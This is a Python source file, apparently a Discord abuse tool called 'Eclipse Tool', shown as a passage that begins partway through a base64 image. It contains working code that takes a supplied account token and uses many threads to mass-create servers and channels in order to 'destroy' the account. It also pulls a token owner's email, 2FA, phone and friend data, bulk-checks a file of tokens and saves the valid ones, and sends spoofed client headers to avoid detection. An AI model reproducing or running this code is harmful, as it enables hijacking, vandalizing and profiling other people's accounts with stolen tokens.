Ec0LxUN7ID+UTaKkwvRZkfXwheXwJ07lG3t6srhqM9+63d4D4fe1O9JEAKJKAMM86534oL3gKkq7nd9vtNlj4b1Zx5LQEY8iHA8iqMVfkUNzm3jfuLYq7Xptil600a4Wm9dLzOKc4s5i/nIgTjts7h5RCb0iW469pOQwoF+nljXj9TBtJkM16abTJ2RJ4qoNqKRiw1GX32mmdLgjd/xef4y1vKXHU3mjYxawidZ8KXrrU8Q6h8dov/Lhv5vHhV87FNHksVugyg+q+7dfTL5vieW/9wSMAL164vtKuxrGoQr7+2IiHl3zsorHNylsosq/NQRk4KJv+Tu9Sv97G9/k9S80zrzTPghR7qhRLSuSerw7V8B5teLQS0UxC98FWv0eolF+bUK7HTuqXJw+Gr6Mw3vz7D//k1AnTubvW68pD5F17cn92kO5djrgW9RFx1qXPx2UnAT4j1L8mMZxlQjkN7mcd/btz04rNE6vrsaH3punSy8hteryAKPPf61Sjx3M9fNfL7p75+ond1KSd+wjvuZ239JCTgwnrjKfXP1+fr8/X5+ny93vr/AMeYP+TXWRyrAAAAAElFTkSuQmCC"
            for x in range(15):
                try:
                    r = requests.post(url2,headers=header, json={'name':"Nuked By Eclipse", 'icon':image})
                    if r.status_code == 200 or 204 or 201:
                        print("Done!")
                        ids.append(r.json()['id'])
                    else:
                        print("Failed")
                except Exception as e:
                    print('Max Server Limit Acceded')

        def channelmake():
            length = len(ids)
            for b in range(length):
                for i in range(15):
                    url1 = f'https://discord.com/api/v9/guilds/{ids[b]}/channels'
                    r = requests.post(url1, headers=header, json={'name':'nuked-by-Eclipse'})

        threads = []

        for _ in range(20):
            t = threading.Thread(target=servercreate)
            t.daemon = True
            t.start()
            threads.append(t)

        for thread in threads:
            t.join()

        threaad = []

        for r in range(40):
            a = threading.Thread(target=channelmake)
            a.daemon = True
            a.start()
            threaad.append(a)

        for thread in threaad:
            a.join()

        print("Finished Account has been destroyed!!!")
    elif options4 in ['0','00']:
      tool()
      return
    else:
      print('Invalid Option')

    while __name__ == '__main__' and options4 not in ['0','00']:
      print(Fore.YELLOW)
      os.system('pause')
      tokennuke()

  global tokeninfo
  def tokeninfo():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Token Information")
    print(f'''
{Fore.RED}
▓███████▓ ▒█████   ▀██ ▄█▀▓█████ ███▄    █       ██ ███▄    █    █████ ▒█████  
▓  ██▒ ▓▒▒██▒  ██▒  ██▄█▒ ▓█   ▀ ██ ▀█   █     ▒▓██ ██ ▀█   █  ▓██    ▒██▒  ██▒
▒ ▓██░ ▒░▒██░  ██▒ ▓███▄░ ▒███  ▓██  ▀█ ██▒    ░▒██▓██  ▀█ ██▒ ▒████  ▒██░  ██▒
░ ▓██▓ ░ ▒██   ██░ ▓██ █▄ ▒▓█  ▄▓██▒  ▐▌██▒     ░██▓██▒  ▐▌██▒ ░▓█▒   ▒██   ██░
  ▒██▒ ░ ░ ████▓▒░ ▒██▒ █▄░▒████▒██░   ▓██░     ░██▒██░   ▓██░▒░▒█░   ░ ████▓▒░
  ▒ ░░   ░ ▒░▒░▒░  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒░   ▒ ▒      ░▓ ░ ▒░   ▒ ▒ ░ ▒ ░   ░ ▒░▒░▒░ 
    ░      ░ ▒ ▒░  ░ ░▒ ▒░ ░ ░  ░ ░░   ░ ▒░      ▒ ░ ░░   ░ ▒░░ ░       ░ ▒ ▒░ 
  ░ ░    ░ ░ ░ ▒   ░ ░░ ░    ░     ░   ░ ░       ▒    ░   ░ ░   ░ ░   ░ ░ ░ ▒  
             ░ ░   ░  ░      ░           ░       ░          ░ ░           ░ ░  
                                        
    ''')
    url = 'https://discord.com/api/v9/users/@me'

    tukan = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the token you want to check?: ''')

    header = {
        "authority": "discord.com",
        "method": "POST",
        "path": "/api/v9/users/@me",
        "scheme": "https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "Authorization": f"{tukan}",
        "content-length": "0",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        'referer': 'https://discord.com/channels/@me',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": useragent(),
        "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    }

    r = requests.get(url, headers=header)

    url2 = 'https://discord.com/api/v9/users/@me/relationships'
    numoffriend = 0
    t = requests.get(url2, headers=header).json()
    for id in t:
      numoffriend += 1

    numofguilds = 0
    e = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=header).json()
    for id in e:
      numofguilds += 1

    cls()
    print(Fore.RESET)
    print(f'User Id: {Fore.RED}{r.json()["id"]}')
    print(f'{Fore.RESET}Full Name: {Fore.RED}{r.json()["username"]}#{r.json()["discriminator"]}')
    print(f'{Fore.RESET}Number Of Friends + Friend Requests: {Fore.RED}{numoffriend}')
    print(f'{Fore.RESET}Number Of Servers: {Fore.RED}{numofguilds}')
    pf = r.json()["avatar"]
    id = r.json()["id"]
    pfp = f'https://cdn.discordapp.com/avatars/{id}/{pf}'

    print(f'{Fore.RESET}Profile Picture: {Fore.RED}{pfp}')
    if r.json()['banner'] == 'null':
        print(f'{Fore.RESET}Banner:{Fore.RED} None')
    else:
        banner = f'https://cdn.discordapp.com/banners/{r.json()["id"]}/{r.json()["banner"]}'
        print(f'{Fore.RESET}Banner: {Fore.RED}{banner}')
    print(f'{Fore.RESET}Bio: {Fore.RED}{r.json()["bio"]}')
    print(f'{Fore.RESET}Language: {Fore.RED}{r.json()["locale"]}')
    print(f'{Fore.RESET}Email: {Fore.RED}{r.json()["email"]}')
    print(f'{Fore.RESET}2fa: {Fore.RED}{r.json()["mfa_enabled"]}')
    print(f'{Fore.RESET}Email Verifed: {Fore.RED}{r.json()["verified"]}')
    if r.json()['phone'] == 'null' or 'Null' or 'None' or '':
        print(f'{Fore.RESET}Phone Verification:{Fore.RED} False')
    else:
        print(f'{Fore.RESET}Phone Verification:{Fore.RED} True')
    print(f'{Fore.RESET}Public Flags: {Fore.RED}{r.json()["public_flags"]}')

    settings = 'https://discord.com/api/v9/users/@me/settings'
    t = requests.get(settings, headers=header)
    print(f'{Fore.RESET}Custom Status: {Fore.RED}{t.json()["custom_status"]}')
    print(f'{Fore.RESET}Status: {Fore.RED}{t.json()["status"]}')

  global checker
  def checker():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Token Checker")
      print(f'''
{Fore.RED}
▓███████▓ ▒█████   ▀██ ▄█▀▓█████ ███▄    █      ▄████▄   ██░ ██ ▓█████ ▀██ ▄█▀▓█████ ██▀███  
▓  ██▒ ▓▒▒██▒  ██▒  ██▄█▒ ▓█   ▀ ██ ▀█   █     ▒██▀ ▀█ ▒▓██░ ██ ▓█   ▀  ██▄█▒ ▓█   ▀▓██ ▒ ██▒
▒ ▓██░ ▒░▒██░  ██▒ ▓███▄░ ▒███  ▓██  ▀█ ██▒    ▒▓█    ▄░▒██▀▀██ ▒███   ▓███▄░ ▒███  ▓██ ░▄█ ▒
░ ▓██▓ ░ ▒██   ██░ ▓██ █▄ ▒▓█  ▄▓██▒  ▐▌██▒    ▒▓▓▄ ▄██ ░▓█ ░██ ▒▓█  ▄ ▓██ █▄ ▒▓█  ▄▒██▀▀█▄  
  ▒██▒ ░ ░ ████▓▒░ ▒██▒ █▄░▒████▒██░   ▓██░    ▒ ▓███▀  ░▓█▒░██▓░▒████ ▒██▒ █▄░▒████░██▓ ▒██▒
  ▒ ░░   ░ ▒░▒░▒░  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒░   ▒ ▒     ░ ░▒ ▒    ▒ ░░▒░▒░░ ▒░  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒▓ ░▒▓░
    ░      ░ ▒ ▒░  ░ ░▒ ▒░ ░ ░  ░ ░░   ░ ▒░      ░  ▒    ▒ ░▒░ ░ ░ ░   ░ ░▒ ▒░ ░ ░    ░▒ ░ ▒░
  ░ ░    ░ ░ ░ ▒   ░ ░░ ░    ░     ░   ░ ░     ░         ░  ░░ ░   ░   ░ ░░ ░    ░     ░   ░ 
             ░ ░   ░  ░      ░           ░     ░ ░       ░  ░  ░   ░   ░  ░      ░     ░     


      ''')
      file = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}do you want to put all the valid tokens in a file?: ''')
      valid = 0
      invalid = 0

      tokens = []
      token = []

      with open('tokens.txt','r') as f:
        for line in f:
          tokens.append(line)

      for element in tokens:
        token.append(element.strip())

      length = len(token)

      if file in yeslist:
        tokenfile = open('validtokens.txt','a')
        for x in range(length):
            header = {
                "authority": "discord.com",
                "scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": f'{token[x]}',
                "content-length": "0",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                'referer': 'https://discord.com/channels/@me',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": useragent(),
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            } 
            r = requests.get('https://discordapp.com/api/v9/users/@me/library', headers = header)  
            if r.status_code == 200:
                print(f'{Fore.YELLOW} [+] Valid {token[x]}' )
                valid += 1
                tokenfile.write(token[x] + '\n')
            else:
                print(f'\033[31m [-] Invalid {token[x]}', )
                invalid += 1

        print(f'{Fore.YELLOW} There are {valid} valid tokens and {invalid} invalid tokens')

      elif file in nolist:
        for x in range(length):
            header = {
                "authority": "discord.com",
                "scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": f'{token[x]}',
                "content-length": "0",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                'referer': 'https://discord.com/channels/@me',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": useragent(),
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            } 
            r = requests.get('https://discordapp.com/api/v9/users/@me/library', headers = header)  
            if r.status_code == 200:
                print(f'{Fore.YELLOW} [+] Valid {token[x]}' )
                valid += 1
            else:
                print(f'\033[31m [-] Invalid {token[x]}', )
                invalid += 1

        print(f'There are {valid} valid tokens and {invalid} invalid tokens')

  global pfpmanager
  def pfpmanager():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Pdp Manager")
    optionsforpfp = print(f'''
    {Fore.RED}
 ██▓███   ▓█████▄  ██▓███       ▄████▄   ██░ ██  ▄▄▄      ███▄    █    ▄████ ▓█████ ██▀███  
▓██░  ██  ▒██▀ ██▌▓██░  ██     ▒██▀ ▀█ ▒▓██░ ██ ▒████▄    ██ ▀█   █ ▒ ██▒ ▀█▒▓█   ▀▓██ ▒ ██▒
▓██░ ██▓▒ ░██   █▌▓██░ ██▓▒    ▒▓█    ▄░▒██▀▀██ ▒██  ▀█▄ ▓██  ▀█ ██▒░▒██░▄▄▄░▒███  ▓██ ░▄█ ▒
▒██▄█▓▒ ▒▒░▓█▄   ▌▒██▄█▓▒ ▒    ▒▓▓▄ ▄██ ░▓█ ░██ ░██▄▄▄▄██▓██▒  ▐▌██▒░░▓█  ██▓▒▓█  ▄▒██▀▀█▄  
▒██▒ ░  ░░░▒████▓ ▒██▒ ░  ░    ▒ ▓███▀  ░▓█▒░██▓ ▓█   ▓██▒██░   ▓██░░▒▓███▀▒░░▒████░██▓ ▒██▒
▒▓▒░ ░  ░░ ▒▒▓  ▒ ▒▓▒░ ░  ░    ░ ░▒ ▒    ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒░   ▒ ▒  ░▒   ▒  ░░ ▒░ ░ ▒▓ ░▒▓░
░▒ ░       ░ ▒  ▒ ░▒ ░           ░  ▒    ▒ ░▒░ ░  ░   ▒▒ ░ ░░   ░ ▒░  ░   ░   ░ ░    ░▒ ░ ▒░
░░         ░ ░  ░ ░░           ░         ░  ░░ ░  ░   ▒     ░   ░ ░ ░ ░   ░ ░   ░     ░   ░ 
             ░                 ░ ░       ░  ░  ░      ░           ░       ░     ░     ░     


    {Fore.RED}[{Fore.YELLOW}1{Fore.RED}] {Fore.YELLOW}ONE PDP
    {Fore.RED}[{Fore.YELLOW}2{Fore.RED}] {Fore.YELLOW}CUSTOM PDP
    {Fore.RED}[{Fore.YELLOW}3{Fore.RED}] {Fore.YELLOW}Eclipse PDP

    ''')

    optionsforpfp = int(input(f"""{Fore.RED}[{Fore.YELLOW}>{Fore.RED}]{Fore.YELLOW}"""))

    if optionsforpfp == 1:
        image = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the name of the image (Make sure the image is in the same folder as Menu.py): ''')
        with open(image,'rb') as f:
            byteform = base64.b64encode(f.read())
            imageurl1 = byteform.decode('utf-8')

        payload1 = {
            'avatar':f'data:image/png;base64,{imageurl1}'
        }

    elif optionsforpfp == 2:
        path = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the directory where all the images are?: ''')
        path.replace(r'\\','\\\\')

        image1 = random.choice([
        x for x in os.listdir(path)
        if os.path.isfile(os.path.join(path, x))
    ])

        with open(image1,'rb') as e:
            byteform = base64.b64encode(e.read())
            imageurl2 = byteform.decode('utf-8')

        payload2 = {
            'avatar':f'data:image/png;base64,{imageurl2}'
        }

    elif optionsforpfp == 3:
        image = "data:image/jpg;base64,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